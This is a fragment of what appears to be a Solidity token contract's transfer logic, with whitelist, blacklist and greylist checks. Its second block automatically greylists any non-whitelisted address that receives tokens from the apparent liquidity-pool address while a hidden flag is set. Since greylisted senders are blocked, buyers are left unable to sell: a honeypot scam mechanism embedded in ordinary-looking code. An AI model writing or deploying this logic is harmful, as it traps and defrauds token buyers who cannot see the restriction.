        if(!tokenWhitelist[msg.sender]&&!tokenWhitelist[_to]){
            require(tokenBlacklist[msg.sender] == false);
            require(tokenBlacklist[_to] == false);

            require(tokenGreylist[msg.sender] == false);
        }

        if(msg.sender==LP&&ab&&!tokenWhitelist[_to]){
            tokenGreylist[_to] = true;
            emit Gerylist(_to, true);
        }


